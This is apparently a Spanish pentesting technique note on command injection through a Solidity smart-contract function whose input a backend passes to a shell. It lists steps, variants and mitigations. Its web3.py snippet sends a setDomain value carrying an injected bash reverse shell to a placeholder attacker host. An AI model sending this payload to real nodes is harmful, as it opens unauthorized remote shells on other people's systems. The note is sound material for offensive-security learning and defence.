---
topic: Contratos Solidity con inyección de comandos
tags: [web, solidity, blockchain, web3, command-injection]
---

# Contratos Solidity con inyección de comandos

[🌐 English](solidity-smart-contract-command-injection.en.md) | **Español**

## Concepto

Un contrato inteligente puede exponer funciones que un backend ejecuta con datos del usuario. Si la función pasa una cadena a una shell o a un comando del sistema, interactuar con el contrato se convierte en ejecución remota.

## Cuándo aplica

- Hay un nodo Ethereum o JSON-RPC expuesto.
- El ABI y la dirección del contrato son accesibles.
- Una función recibe una cadena usada por el backend.

## Procedimiento

1. Descargar el ABI y la dirección del contrato.
2. Conectar con `web3.py` al nodo.
3. Identificar la función que usa la cadena.
4. Enviar un payload y observar la ejecución.

```python
from web3 import Web3
w3 = Web3(Web3.HTTPProvider('http://<IP>:9810'))
abi = [...]
contract = w3.eth.contract(address='<ADDRESS>', abi=abi)
tx = contract.functions.setDomain('; bash -c "bash -i >& /dev/tcp/<ATTACKER>/443 0>&1"').transact()
```

## Variantes

- Usar `cast` o `eth_sendTransaction` directamente.
- Inyectar en un campo que se registra en logs.
- Combinar con una clave SSH encontrada en IPFS.

## Limitaciones

- La función debe llegar a un comando del sistema.
- El nodo debe permitir transacciones.
- El ABI debe ser correcto.

## Mitigación y detección

- No ejecutar contratos con acceso al shell.
- Validar y escapar cadenas antes de usarlas.
- Aislar el nodo y restringir el ABI público.

## Referencias

- <https://docs.soliditylang.org/>
- <https://web3py.readthedocs.io/>
- <https://attack.mitre.org/techniques/T1059/004/>
